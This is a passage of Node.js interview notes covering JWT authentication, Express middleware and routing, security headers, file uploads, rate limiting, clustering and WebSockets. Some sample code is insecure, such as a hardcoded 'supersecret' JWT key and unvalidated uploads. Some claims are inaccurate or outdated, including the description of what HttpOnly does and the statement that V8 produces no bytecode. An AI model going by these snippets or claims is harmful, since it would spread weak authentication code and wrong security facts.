jwt.sign(payload, secretOrPrivateKey, [options, callback])
```

- **Header** - Consists of two parts: the type of token (i.e., JWT) and the signing algorithm (i.e., HS512)
- **Payload** - Contains the claims that provide information about a user who has been authenticated along with other information such as token expiration time.
- **Signature** - Final part of a token that wraps in the encoded header and payload, along with the algorithm and a secret

**Installation:**

```
npm install jsonwebtoken bcryptjs --save
```

**Example**:

```
/**
 * AuthController.js
 */
const express = require('express');
const router = express.Router();
const bodyParser = require('body-parser');
const User = require('../user/User');

const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const config = require('../config');

router.use(bodyParser.urlencoded({ extended: false }));
router.use(bodyParser.json());

router.post('/register', function(req, res) {

  let hashedPassword = bcrypt.hashSync(req.body.password, 8);

  User.create({
    name : req.body.name,
    email : req.body.email,
    password : hashedPassword
  },
  function (err, user) {
    if (err) return res.status(500).send("There was a problem registering the user.")
    // create a token
    let token = jwt.sign({ id: user._id }, config.secret, {
      expiresIn: 86400 // expires in 24 hours
    });
    res.status(200).send({ auth: true, token: token });
  });
});
```

**config.js:**

```
/**
 * config.js
 */
module.exports = {
  'secret': 'supersecret'
};
```

The `jwt.sign()` method takes a payload and the secret key defined in `config.js` as parameters. It creates a unique string of characters representing the payload. In our case, the payload is an object containing only the id of the user.

**Reference:**

- [*https://www.npmjs.com/package/jsonwebtoken*](https://www.npmjs.com/package/jsonwebtoken)

1. **Explain the use of next in Node.js?**

The **next** is a function in the Express router which executes the middleware succeeding the current middleware.

**Example:**

To load the middleware function, call `app.use()`, specifying the middleware function. For example, the following code loads the **myLogger** middleware function before the route to the root path (/).

```jsx
/**
 * myLogger
 */
const express = require("express");
const app = express();

const myLogger = function (req, res, next) {
  console.log("LOGGED");
  next();
};

app.use(myLogger);

app.get("/", (req, res) => {
  res.send("Hello World!");
});

app.listen(3000);
```

*Note: The `next()` function is not a part of the Node.js or Express API, but is the third argument that is passed to the middleware function. The `next()` function could be named anything, but by convention it is always named “next”. To avoid confusion, always use this convention.*

1. **What are the security mechanisms available in Node.js?**

**1. Helmet module:**

[Helmet](https://www.npmjs.com/package/helmet) helps to secure your Express applications by setting various HTTP headers, like:

- X-Frame-Options to mitigates clickjacking attacks,
- Strict-Transport-Security to keep your users on HTTPS,
- X-XSS-Protection to prevent reflected XSS attacks,
- X-DNS-Prefetch-Control to disable browsers DNS prefetching.

```jsx
/**
 * Helmet
 */
const express = require('express')
const helmet = require('helmet')
const app = express()

app.use(helmet())
```

**2. JOI module:**

Validating user input is one of the most important things to do when it comes to the security of your application. Failing to do it correctly can open up your application and users to a wide range of attacks, including command injection, SQL injection or stored cross-site scripting.

To validate user input, one of the best libraries you can pick is joi. [Joi](https://www.npmjs.com/package/joi) is an object schema description language and validator for JavaScript objects.

```jsx
/**
 * Joi
 */
const Joi = require('joi');

const schema = Joi.object().keys({
    username: Joi.string().alphanum().min(3).max(30).required(),
    password: Joi.string().regex(/^[a-zA-Z0-9]{3,30}$/),
    access_token: [Joi.string(), Joi.number()],
    birthyear: Joi.number().integer().min(1900).max(2013),
    email: Joi.string().email()
}).with('username', 'birthyear').without('password', 'access_token')

// Return result
const result = Joi.validate({
    username: 'abc',
    birthyear: 1994
}, schema)
// result.error === null -> valid
```

**3. Regular Expressions:**

Regular Expressions are a great way to manipulate texts and get the parts that you need from them. However, there is an attack vector called Regular Expression Denial of Service attack, which exposes the fact that most Regular Expression implementations may reach extreme situations for specially crafted input, that cause them to work extremely slowly.

The Regular Expressions that can do such a thing are commonly referred as Evil Regexes. These expressions contain: *grouping with repetition, *inside the repeated group: *repetition, or *alternation with overlapping

Examples of Evil Regular Expressions patterns:

```jsx
(a+)+
([a-zA-Z]+)*
(a|aa)+
```

**4. Security.txt:**

Security.txt defines a standard to help organizations define the process for security researchers to securely disclose security vulnerabilities.

```jsx
const express = require('express')
const securityTxt = require('express-security.txt')

const app = express()

app.get('/security.txt', securityTxt({
  // your security address
  contact: 'email@example.com',
  // your pgp key
  encryption: 'encryption',
  // if you have a hall of fame for securty resourcers, include the link here
  acknowledgements: 'http://acknowledgements.example.com'
}))
```

1. **How to handle file upload in Node.js?**

File can be uploaded to the server using Multer module. Multer is a Node.js middleware which is used for handling multipart/form-data, which is mostly used library for uploading files.

**1. Installing the dependencies:**

```
npm install express body-parser multer --save
```

**2. server.js:**

```jsx
/**
 * File Upload in Node.js
 */
const express = require("express");
const bodyParser = require("body-parser");
const multer = require("multer");
const app = express();

// for text/number data transfer between clientg and server
app.use(bodyParser());

const storage = multer.diskStorage({
  destination: function (req, file, callback) {
    callback(null, "./uploads");
  },
  filename: function (req, file, callback) {
    callback(null, file.fieldname + "-" + Date.now());
  },
});

const upload = multer({ storage: storage }).single("userPhoto");

app.get("/", function (req, res) {
  res.sendFile(__dirname + "/index.html");
});

// POST: upload for single file upload
app.post("/api/photo", function (req, res) {
  upload(req, res, function (err) {
    if (err) {
      return res.end("Error uploading file.");
    }
    res.end("File is uploaded");
  });
});

app.listen(3000, function () {
  console.log("Listening on port 3000");
});
```

**3. index.html:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Multer-File-Upload</title>
</head>
<body>
    <h1>MULTER File Upload | Single File Upload</h1> 

    <form id = "uploadForm"
         enctype = "multipart/form-data"
         action = "/api/photo"
         method = "post"
    >
      <input type="file" name="userPhoto" />
      <input type="submit" value="Upload Image" name="submit">
    </form>
</body>
</html>
```

1. **How can you secure your HTTP cookies against XSS attacks?**

**1.** When the web server sets cookies, it can provide some additional attributes to make sure the cookies won't be accessible by using malicious JavaScript. One such attribute is HttpOnly.

```
Set-Cookie: [name]=[value]; HttpOnly
```

HttpOnly makes sure the cookies will be submitted only to the domain they originated from.

**2.** The "Secure" attribute can make sure the cookies are sent over secured channel only.

```
Set-Cookie: [name]=[value]; Secure
```

**3.** The web server can use X-XSS-Protection response header to make sure pages do not load when they detect reflected cross-site scripting (XSS) attacks.

```
X-XSS-Protection: 1; mode=block
```

**4.** The web server can use HTTP Content-Security-Policy response header to control what resources a user agent is allowed to load for a certain page. It can help to prevent various types of attacks like Cross Site Scripting (XSS) and data injection attacks.

`Content-Security-Policy: default-src 'self' *.http://sometrustedwebsite.com`

1. **How to make post request in Node.js?**

Following code snippet can be used to make a Post Request in Node.js.

```jsx
/**
 * POST Request
 */
const request = require("request");

request.post("http://localhost:3000/action",  { form: { key: "value" } },
  function (error, response, body) {
    if (!error && response.statusCode === 200) {
      console.log(body);
    }
  }
);
```

1. **What is JIT and how is it related to Node.js?**

Node.js has depended on the V8 JavaScript engine to provide code execution in the language. The V8 is a JavaScript engine built at the google development center, in Germany. It is open source and written in C++. It is used for both client side (Google Chrome) and server side (node.js) JavaScript applications. A central piece of the V8 engine that allows it to execute JavaScript at high speed is the JIT (Just In Time) compiler. This is a dynamic compiler that can optimize code during runtime. When V8 was first built the JIT Compiler was dubbed FullCodegen. Then, the V8 team implemented Crankshaft, which included many performance optimizations that FullCodegen did not implement.

The `V8` was first designed to increase the performance of the JavaScript execution inside web browsers. In order to obtain speed, V8 translates JavaScript code into more efficient machine code instead of using an interpreter. It compiles JavaScript code into machine code at execution by implementing a JIT (Just-In-Time) compiler like a lot of modern JavaScript engines such as SpiderMonkey or Rhino (Mozilla) are doing. The main difference with V8 is that it doesn't produce bytecode or any intermediate code.

1. **How to generate and verify checksum of the given string in Nodejs**

The **checksum** (aka **hash sum**) calculation is a one-way process of mapping an extensive data set of variable length (e.g., message, file), to a smaller data set of a fixed length (hash). The length depends on a hashing algorithm.

For the checksum generation, we can use node `crypto()` module. The module uses `createHash(algorithm)` to create a checksum (hash) generator. The algorithm is dependent on the available algorithms supported by the version of OpenSSL on the platform.

**Example:**

```jsx
const crypto = require('crypto');

// To get a list of all available hash algorithms
crypto.getHashes() // [ 'md5', 'sha1', 'sha3-256', ... ]

  
// Create hash of SHA1 type
const key = "MY_SECRET_KEY";

// 'digest' is the output of hash function containing  
// only hexadecimal digits
hashPwd = crypto.createHash('sha1').update(key).digest('hex');
  
console.log(hashPwd); //ef5225a03e4f9cc953ab3c4dd41f5c4db7dc2e5b
```

1. **How do you manage environment variables in Node.js?**

Environment variables store configuration details, such as database credentials or API keys, outside your codebase. This makes your application more secure and flexible across environments like development, testing, and production.

**Using `dotenv` (Most common method)**

The `dotenv` package is the most widely used way to manage environment variables in Node.js.

Here’s how to use it:

Install the `dotenv` package:

`npm install dotenv`

Create a `.env` file:

```jsx
DB_HOST=localhost
DB_USER=root
DB_PASS=securepassword
```

Load variables in your application:

```jsx
require('dotenv').config();

const dbHost = process.env.DB_HOST;
console.log(`Connecting to database at ${dbHost}`);
```

This approach ensures sensitive information isn’t hardcoded and makes deployment across different environments seamless.

**Alternative method: Using Node.js 20.6.0+ Native Support**

Starting with Node.js 20.6.0, you can load environment variables from a `.env` file without installing any additional packages.

Simply run your Node.js application with the `--env-file` flag:

`node --env-file=.env app.js`

This command automatically loads the variables defined in the `.env` file into `process.env`.

**Which method should you use?**

It depends:

- The `dotenv` package remains the most common choice because it works across all versions of Node.js and offers flexibility for advanced use cases

The built-in support is great for simple setups, but it lacks features like handling multiple environment files.

1. **How do you implement routing in a Node.js application?**

Routing defines how an application responds to HTTP requests for specific endpoints (URLs) and HTTP methods (GET, POST, etc.).

In Node.js, you can handle routing with the built-in `http` module, but using a framework like Express significantly simplifies the process.

**For example (Using Express):**

```jsx
const express = require('express');
const app = express();

// Define routes
app.get('/', (req, res) => {
  res.send('Welcome to the homepage!');
});

app.get('/about', (req, res) => {
  res.send('This is the about page.');
});

app.post('/submit', (req, res) => {
  res.send('Form submitted!');
});

// Start the server
app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
```

How it works:

1. Routes are defined for specific HTTP methods and endpoints, such as `GET /` or `POST /submit`
2. Each route includes a handler function that specifies how the server responds. For example, the `GET /about` route sends a message: "This is the about page"
3. The `listen` method starts the server, making it accessible on the specified port

Why use Express for routing?

- **Simplified Syntax**: Express reduces boilerplate code, making routes easy to define and manage
- **Middleware Integration**: Middleware can be attached to routes for tasks like authentication, logging, or validation
- **Scalability**: For larger applications, you can group related routes into separate modules, keeping your codebase organized and maintainable

1. **What is middleware in Node.js, and how is it used in Express?**

Middleware in Node.js is a function that has access to the request and response objects, as well as the `next()` function. It’s commonly used in Express to handle tasks like logging, authentication, error handling, and parsing incoming requests.

Here’s an example of a simple logging middleware:

```jsx
const express = require('express');
const app = express();

app.use((req, res, next) => {
  console.log(`${req.method} request to ${req.url}`);
  next(); // Pass control to the next middleware
});

app.get('/', (req, res) => {
  res.send('Hello, World!');
});

app.listen(3000, () => console.log('Server running on http://localhost:3000'));
```

In this example:

- Middleware logs the HTTP method and URL for every request
- Middleware functions execute in the order they’re defined, making them flexible for building modular and reusable application features

1. **How do you handle errors in Node.js?**

Error handling is essential in Node.js, especially since many operations are asynchronous. There are several common patterns:

**Using Callbacks**

Many asynchronous methods accept a callback with an `err` parameter.

```jsx
fs.readFile('file.txt', 'utf8', (err, data) => {
  if (err) {
	console.error('Error reading file:', err.message);
	return;
  }
  console.log(data);
});
```

**Using Promises**

Promises handle errors with `.catch()`.

```jsx
fs.promises.readFile('file.txt', 'utf8')
  .then((data) => console.log(data))
  .catch((err) => console.error('Error:', err.message));
```

**Using `try...catch` with Async/Await**

Async/await provides a clean way to handle errors.

```jsx
async function readFile() {
  try {
	const data = await fs.promises.readFile('file.txt', 'utf8');
	console.log(data);
  } catch (err) {
	console.error('Error:', err.message);
  }
}
readFile();
```

Each method is suited to different scenarios, but async/await is preferred in modern applications for its readability.

1. **What is middleware in Node.js, and how is it used in Express?**

Middleware in Node.js is a function that has access to the request and response objects, as well as the `next()` function. It’s commonly used in Express to handle tasks like logging, authentication, error handling, and parsing incoming requests.

Here’s an example of a simple logging middleware:

```jsx
const express = require('express');
const app = express();

app.use((req, res, next) => {
  console.log(`${req.method} request to ${req.url}`);
  next(); // Pass control to the next middleware
});

app.get('/', (req, res) => {
  res.send('Hello, World!');
});

app.listen(3000, () => console.log('Server running on http://localhost:3000'));
```

1. **How does routing work in Node.js?**

Routing defines the way in which the client requests are handled by the application endpoints. We define routing using methods of the Express app object that correspond to HTTP methods; for example, `app.get()` to handle `GET` requests and `app.post` to handle `POST` requests, `app.all()` to handle all HTTP methods and `app.use()` to specify middleware as the callback function.

These routing methods "listens" for requests that match the specified route(s) and method(s), and when it detects a match, it calls the specified callback function.

*Syntax*:

```
app.METHOD(PATH, HANDLER)
```

Where:

- app is an instance of express.
- METHOD is an `HTTP request method`.
- PATH is a path on the server.
- HANDLER is the function executed when the route is matched.

**a) Route methods:**

```jsx
// GET method route
app.get('/', function (req, res) {
  res.send('GET request')
})

// POST method route
app.post('/login', function (req, res) {
  res.send('POST request')
})

// ALL method route
app.all('/secret', function (req, res, next) {
  console.log('Accessing the secret section ...')
  next() // pass control to the next handler
})
```

**b) Route paths:**

Route paths, in combination with a request method, define the endpoints at which requests can be made. Route paths can be strings, string patterns, or regular expressions.

The characters `?`, `+`, `*`, and `()` are subsets of their regular expression counterparts. The hyphen `(-)` and the dot `(.)` are interpreted literally by string-based paths.

**Example:**

```jsx
// This route path will match requests to /about.
app.get('/about', function (req, res) {
  res.send('about')
})

// This route path will match acd and abcd.
app.get('/ab?cd', function (req, res) {
  res.send('ab?cd')
})

// This route path will match butterfly and dragonfly
app.get(/.*fly$/, function (req, res) {
  res.send('/.*fly$/')
})
```

**c) Route parameters:**

Route parameters are named URL segments that are used to capture the values specified at their position in the URL. The captured values are populated in the `req.params` object, with the name of the route parameter specified in the path as their respective keys.

**Example:**

```jsx
app.get('/users/:userId', function (req, res) {
  res.send(req.params)
})
```

**Response methods:**

| **Method** | **Description** |
| --- | --- |
| `res.download()` | Prompt a file to be downloaded. |
| `res.end()` | End the response process. |
| `res.json()` | Send a JSON response. |
| `res.jsonp()` | Send a JSON response with JSONP support. |
| `res.redirect()` | Redirect a request. |
| `res.render()` | Render a view template. |
| `res.send()` | Send a response of various types. |
| `res.sendFile()` | Send a file as an octet stream. |
| `res.sendStatus()` | Set the response status code and send its string representation as the response body. |

**d) Router method:**

```jsx
const express = require('express')
const router = express.Router()

// middleware that is specific to this router
router.use(function timeLog (req, res, next) {
  console.log('Time: ', Date.now())
  next()
})

// define the home page route
router.get('/', function (req, res) {
  res.send('Birds home page')
})

// define the about route
router.get('/about', function (req, res) {
  res.send('About birds')
})

module.exports = router
```

1. **How does Node.js handle concurrency with a single-threaded architecture?**

**Detailed Explanation**

Node.js runs your JavaScript code on **a single main thread**, but it achieves high concurrency by using an **event-driven, non-blocking I/O model** powered by the **event loop** and an underlying C++ library called **libuv**.

Here's what actually happens under the hood:

1. **The JavaScript execution is single-threaded.** Only one piece of JS code runs at a time on the "main thread."
2. **I/O operations are offloaded.** When you do something like reading a file, making a DB query, or a network request, Node.js hands it off to the system (the OS kernel for network sockets, or libuv's thread pool for file system operations, DNS, crypto, etc.).
3. **The main thread keeps running.** Instead of waiting for that I/O to finish, Node.js immediately moves on to other work.
4. **The event loop picks up completions.** When the I/O finishes, a callback is queued and eventually executed on the main thread.

**The Event Loop Phases**

The event loop processes callbacks in phases (in order):

1. **Timers** — callbacks from `setTimeout` / `setInterval`
2. **Pending callbacks** — some system-level I/O callbacks
3. **Idle, prepare** — internal use
4. **Poll** — retrieves new I/O events; executes I/O callbacks
5. **Check** — `setImmediate()` callbacks run here
6. **Close callbacks** — e.g., `socket.on('close', ...)`

`process.nextTick()` and Promise microtasks run **between** every phase.

**Code Example**

```jsx
const fs = require('fs');

console.log('1. Start');

fs.readFile('data.txt', 'utf-8', (err, data) => {
  console.log('3. File read complete');
});

setTimeout(() => console.log('4. Timer fired'), 0);

Promise.resolve().then(() => console.log('2a. Microtask'));

console.log('2. End of sync code');

// Output order:
// 1. Start
// 2. End of sync code
// 2a. Microtask        <-- microtasks run before next phase
// 4. Timer fired       <-- timer phase
// 3. File read complete <-- poll phase (I/O)
```

### Important Notes

- **CPU-bound tasks block the event loop.** A heavy `for` loop or synchronous crypto will freeze the entire server. Use **Worker Threads** for CPU-heavy work.
- **libuv thread pool** defaults to 4 threads (configurable via `UV_THREADPOOL_SIZE`). It's used for `fs`, `crypto.pbkdf2`, DNS, and zlib.
- Network I/O uses the OS's async mechanisms (epoll on Linux, kqueue on macOS, IOCP on Windows) — not the thread pool.

### Summary

> Node.js uses a **single main thread** to run JavaScript but delegates I/O operations to the OS or a libuv thread pool. An **event loop** then picks up completed operations and runs their callbacks. This allows Node.js to handle thousands of concurrent connections efficiently — as long as the work is I/O-bound. CPU-heavy work should be moved to Worker Threads or a separate service to avoid blocking the loop.
> 

1. **What is clustering in Node.js and when should you use it?**

**Detailed Explanation**

Since Node.js is single-threaded by default, **a single Node process can only use one CPU core**, no matter how many cores your server has. **Clustering** is the solution: it lets you spawn multiple Node processes (called **workers**) that share the same server port.

The built-in `cluster` module does this. One **master/primary** process forks several workers, and incoming connections are distributed among them (round-robin on most platforms, OS-decided on Windows).

### How It Works

- The master process doesn't handle requests; it only manages workers.
- Each worker is a full Node.js process with its own event loop, memory, and V8 instance.
- They share the server port through IPC between master and workers.

### Code Example

```jsx
const cluster = require('cluster');
const http = require('http');
const os = require('os');

const numCPUs = os.cpus().length;

if (cluster.isPrimary) {
  console.log(`Primary ${process.pid} running`);

  // Fork one worker per CPU core
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  // Restart any worker that dies
  cluster.on('exit', (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} died. Restarting...`);
    cluster.fork();
  });
} else {
  // Workers share the TCP connection
  http.createServer((req, res) => {
    res.writeHead(200);
    res.end(`Hello from worker ${process.pid}\n`);
  }).listen(3000);

  console.log(`Worker ${process.pid} started`);
}
```

**When to Use Clustering**

- You have a multi-core server and want to **utilize all CPU cores**.
- Your application is CPU-bound at moments (JSON parsing, template rendering, etc.) and you want to isolate that impact.
- You need **fault tolerance** — if one worker crashes, others keep serving requests.
- You want **zero-downtime deployments** (gracefully restart workers one at a time).

**PM2: The Production-Friendly Alternative**

In production, most teams don't use `cluster` directly. They use **PM2**, a process manager that wraps clustering plus logging, monitoring, auto-restart, and zero-downtime reloads.

bash

```jsx
# Run app with one worker per core
pm2 start app.js -i max

# Zero-downtime reload
pm2 reload app
```

### Important Considerations

- **No shared memory between workers.** If you use in-memory caches or session storage, switch to Redis/Memcached.
- **Sticky sessions** are needed for WebSocket connections — use `@socket.io/sticky` or a load balancer feature.
- On modern setups, many people use a **reverse proxy + containers** (Nginx + multiple Docker containers) instead of the cluster module.

### Summary

> Clustering lets a Node.js app use multiple CPU cores by forking multiple worker processes that share the same port. The built-in `cluster` module handles this, but **PM2** is the production-preferred tool. Use clustering when you want better CPU utilization, fault tolerance, and zero-downtime reloads. Remember: workers don't share memory, so external stores (Redis) are needed for shared state.
> 

1. **How do you handle rate limiting and brute-force protection in Express apps?**

**Detailed Explanation:**

**Rate limiting** restricts how many requests a client can make in a given time window. It's essential to prevent:

- **Brute-force attacks** on login endpoints
- **API abuse** and scraping
- **DDoS-style traffic spikes**
- **Accidental overload** from buggy clients

**Tool 1: `express-rate-limit` (Most Common)**

```jsx
const rateLimit = require('express-rate-limit');

// Global rate limit
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                 // 100 requests per window per IP
  standardHeaders: true,    // Sends RateLimit-* headers
  legacyHeaders: false,
  message: 'Too many requests, please try again later.',
});

app.use(globalLimiter);

// Stricter limit on login endpoint
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // only 5 login attempts per 15 minutes
  skipSuccessfulRequests: true, // don't count successful logins
  message: 'Too many failed login attempts. Try again in 15 minutes.',
});

app.post('/login', loginLimiter, loginController);
```

**Tool 2: `express-slow-down` (Gradual Slowdown)**

Instead of blocking outright, this **delays** responses as the request count climbs:

```jsx
const slowDown = require('express-slow-down');

const speedLimiter = slowDown({
  windowMs: 15 * 60 * 1000,
  delayAfter: 50,      // first 50 requests are normal
  delayMs: () => 500,  // then add 500ms delay for each request
});

app.use(speedLimiter);
```

**Distributed Rate Limiting with Redis**

In a clustered or multi-server environment, an in-memory counter won't work — each process has its own. Use a **shared Redis store**:

```jsx
const { RateLimiterRedis } = require('rate-limiter-flexible');
const Redis = require('ioredis');

const redisClient = new Redis();

const rateLimiter = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'middleware',
  points: 10,      // 10 requests
  duration: 1,     // per 1 second
});

const rateLimitMiddleware = (req, res, next) => {
  rateLimiter.consume(req.ip)
    .then(() => next())
    .catch(() => res.status(429).send('Too Many Requests'));
};

app.use(rateLimitMiddleware);
```

**Brute-Force Protection Strategies**

Rate limiting alone isn't always enough. Layered defenses for login endpoints:

1. **IP-based rate limiting** — as above.
2. **Account-based lockout** — track failed attempts per user, lock account after N failures.
3. **CAPTCHA** — show after 3 failed attempts.
4. **Progressive delays** — each failed attempt adds delay.
5. **2FA** — the strongest protection.

**Example: Account-Based Lockout**

```jsx
const { RateLimiterRedis } = require('rate-limiter-flexible');

const maxWrongAttempts = 5;
const blockDuration = 60 * 15; // 15 min

const loginLimiter = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'login_fail',
  points: maxWrongAttempts,
  duration: 60 * 60,  // attempts count over 1 hour
  blockDuration,
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const key = `${req.ip}_${username}`;

  try {
    await loginLimiter.consume(key);

    const user = await authenticate(username, password);
    if (!user) {
      throw new Error('Invalid credentials');
    }

    await loginLimiter.delete(key); // clear on success
    res.json({ token: generateToken(user) });
  } catch (err) {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

**Don't Forget: Trust Proxy**

If your app sits behind Nginx, a load balancer, or a CDN, set `trust proxy` so `req.ip` reflects the real client IP:

javascript

`a**pp.set('trust proxy', 1);**`

### Summary

> Use **`express-rate-limit`** for straightforward per-IP limits, **`express-slow-down`** for graceful degradation, and **`rate-limiter-flexible` with Redis** for distributed setups. For brute-force protection on logins, combine IP rate limiting with **account-based lockouts, progressive delays, CAPTCHA, and 2FA**. Always configure `trust proxy` when behind a reverse proxy so real IPs are used.
> 

1. **What are WebSockets and how are they implemented in Node.js?**

**Detailed Explanation**

**WebSockets** provide a **full-duplex, persistent** communication channel between client and server over a single TCP connection. Unlike HTTP (request-response), WebSockets allow the **server to push data to the client** at any time, without the client needing to poll.

**How WebSockets Work**

1. The client sends an HTTP request with an `Upgrade: websocket` header.
2. The server responds with `101 Switching Protocols`.
3. The connection is "upgraded" — the same TCP socket is now used for WebSocket framing.
4. Both sides can send messages whenever they want until one closes the connection.

**Use Cases**

- Chat applications
- Live notifications
- Real-time dashboards (stocks, analytics)
- Collaborative editing (Google Docs-style)
- Multiplayer games
- Live sports scores

**Option 1: The `ws` Library (Lightweight)**

// Server side

```jsx
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws) => {
  console.log('Client connected');

  ws.on('message', (data) => {
    console.log('Received:', data.toString());

    // Echo back to sender
    ws.send(`Echo: ${data}`);

    // Broadcast to all connected clients
    wss.clients.forEach((client) => {
      if (client !== ws && client.readyState === WebSocket.OPEN) {
        client.send(data.toString());
      }
    });
  });

  ws.on('close', () => console.log('Client disconnected'));
  ws.send('Welcome!');
});
```

Client side (browser):

```jsx
const ws = new WebSocket('ws://localhost:8080');

ws.onopen = () => ws.send('Hello server');
ws.onmessage = (event) => console.log('From server:', event.data);
ws.onclose = () => console.log('Disconnected');
```

 **Option 2: Socket.IO (Feature-Rich)**

Socket.IO is built on top of WebSockets but adds: **auto-reconnection, rooms/namespaces, fallback to long-polling, acknowledgments, and broadcasting APIs**.

```jsx

const { Server } = require('socket.io');
const http = require('http');
const express = require('express');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

io.on('connection', (socket) => {
  console.log(`User connected: ${socket.id}`);

  socket.on('join-room', (roomId) => {
    socket.join(roomId);
    socket.to(roomId).emit('user-joined', socket.id);
  });

  socket.on('chat-message', ({ room, message }) => {
    io.to(room).emit('chat-message', { from: socket.id, message });
  });

  socket.on('disconnect', () => {
    console.log(`User disconnected: ${socket.id}`);
  });
});

server.listen(3000);`
```

Client side (with socket.io-client):

```jsx
import { io } from 'socket.io-client';
const socket = io('http://localhost:3000');

socket.emit('join-room', 'room-42');
socket.on('chat-message', ({ from, message }) => {
  console.log(`${from}: ${message}`);
});
```

### `ws` vs Socket.IO

| Feature | `ws` | Socket.IO |
| --- | --- | --- |
| Protocol | Pure WebSocket | WebSocket + fallbacks |
| Auto-reconnect | Manual | Built-in |
| Rooms/namespaces | Manual | Built-in |
| Bundle size | Tiny | Larger |
| Interoperability | Any WS client | Socket.IO client required |
| Best for | Performance, custom protocols | Rapid development, chat apps |

**Scaling WebSockets**

When clustering or running multiple servers, a user connected to Server A can't directly message a user on Server B. Solutions:

- **Redis Pub/Sub adapter** (for Socket.IO: `@socket.io/redis-adapter`)
- **Sticky sessions** at the load balancer so the same client always hits the same server.

```jsx
const { createAdapter } = require('@socket.io/redis-adapter');
const { createClient } = require('redis');

const pubClient = createClient({ url: 'redis://localhost:6379' });
const subClient = pubClient.duplicate();

await Promise.all([pubClient.connect(), subClient.connect()]);
io.adapter(createAdapter(pubClient, subClient));
```

### Summary

> WebSockets enable **bidirectional, persistent communication** between client and server over a single TCP connection after an HTTP upgrade handshake. In Node.js, use **`ws`** for a lightweight, pure-WebSocket implementation or **Socket.IO** when you need auto-reconnection, rooms, and broadcast features out of the box. For multi-server scaling, combine with a **Redis adapter** and **sticky sessions**.
> 

1. **How do you create and verify JWT tokens for authentication?**

### Detailed Explanation

**JWT (JSON Web Token)** is a compact, URL-safe token format used to securely transmit information between parties as a JSON object. It's widely used for **stateless authentication** — the server doesn't need to store sessions; it just verifies the token's signature on each request.

### JWT Structure

A JWT has three parts separated by dots: `header.payload.signature`

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsIm5hbWUiOiJKb2huIn0.abc123xyz...`

1. **Header** — algorithm and token type (e.g., `{ "alg": "HS256", "typ": "JWT" }`)
2. **Payload** — claims: user ID, roles, expiration, etc.
3. **Signature** — created by hashing header + payload with a secret key

The payload is **Base64-encoded, not encrypted**, so never put sensitive data (passwords, credit cards) in it.

### Installation

bash

`npm install jsonwebtoken bcryptjs`

### Creating (Signing) a Token

javascript

`const jwt = require('jsonwebtoken');

const SECRET = process.env.JWT_SECRET; // strong random string

function generateToken(user) {
  const payload = {
    sub: user.id,          // subject (user ID)
    email: user.email,
    role: user.role,
  };

  return jwt.sign(payload, SECRET, {
    expiresIn: '15m',       // short-lived access token
    issuer: 'my-api',
    audience: 'my-app-users',
  });
}`

### Verifying a Token (Middleware)

```jsx
function authenticate(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.split(' ')[1];

  try {
    const decoded = jwt.verify(token, SECRET, {
      issuer: 'my-api',
      audience: 'my-app-users',
    });
    req.user = decoded; // attach payload to request
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired' });
    }
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// Usage
app.get('/profile', authenticate, (req, res) => {
  res.json({ user: req.user });
});
```

### Full Login Flow Example

```jsx
const bcrypt = require('bcryptjs');

app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  const user = await User.findOne({ email });
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  const valid = await bcrypt.compare(password, user.passwordHash);
  if (!valid) return res.status(401).json({ error: 'Invalid credentials' });

  const accessToken = jwt.sign(
    { sub: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );

  const refreshToken = jwt.sign(
    { sub: user.id },
    process.env.REFRESH_SECRET,
    { expiresIn: '7d' }
  );

  // Store refresh token securely (DB or HttpOnly cookie)
  res.json({ accessToken, refreshToken });
});
```

### Access Token + Refresh Token Pattern

- **Access token** — short-lived (15 min), sent with every request.
- **Refresh token** — long-lived (days/weeks), used only to get a new access token.

```jsx
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  try {
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);

    // Optional: verify the refresh token is still valid in DB (not revoked)
    const stored = await RefreshToken.findOne({ userId: decoded.sub, token: refreshToken });
    if (!stored) return res.status(401).json({ error: 'Revoked token' });

    const newAccessToken = jwt.sign(
      { sub: decoded.sub },
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });
  } catch {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});
```

### Security Best Practices

- **Use a strong secret** (at least 32 random bytes) and keep it in environment variables.
- **Short expiration** on access tokens (15 min is common).
- **HTTPS only** — JWTs are bearer tokens; anyone who steals one can use it.
- **Don't store in `localStorage`** for sensitive apps — use `HttpOnly`, `Secure`, `SameSite=strict` cookies.
- **Rotate refresh tokens** — issue a new refresh token each time one is used.
- **Maintain a revocation list** (in Redis/DB) for logout and compromised tokens, since JWTs are stateless by default.
- **Consider asymmetric algorithms** (`RS256`) when multiple services verify but only one issues tokens.

### Summary

> Use the **`jsonwebtoken`** library with `jwt.sign()` to create tokens at login and `jwt.verify()` in middleware to authenticate requests. JWTs are **stateless and self-contained** — the server validates by checking the signature rather than looking up a session. Use a **short-lived access token + long-lived refresh token** pattern, keep secrets in environment variables, use HTTPS, store tokens in HttpOnly cookies when possible, and maintain a revocation strategy for logout scenarios.
> 

1. **How do you create RESTful APIs using Express?**

### Detailed Explanation

